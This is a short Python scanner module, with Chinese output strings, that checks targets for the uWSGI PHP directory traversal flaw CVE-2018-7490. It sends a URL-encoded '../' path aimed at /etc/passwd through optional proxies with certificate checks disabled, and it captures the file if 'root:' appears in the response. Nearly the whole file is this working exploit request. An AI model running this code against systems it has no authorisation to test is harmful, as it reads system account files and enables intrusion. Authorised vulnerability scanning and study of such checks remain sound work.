import requests
import time
from bs4 import BeautifulSoup
import logging

cdd=''
http = ''
https = ''
def dl17(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(url1+'..%2f..%2f..%2f..%2f..%2fetc/passwd',cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'root:' in cd.text:
            cdd = cd.text
        else:
            cdd = '[-]漏洞不存在'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def sj2():
    global cdd
    return '--------------------------------------------------\n[ uWSGI PHP目录穿越漏洞（CVE-2018-7490） ]\n\n'+ str (cdd)+'\n'
def s2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)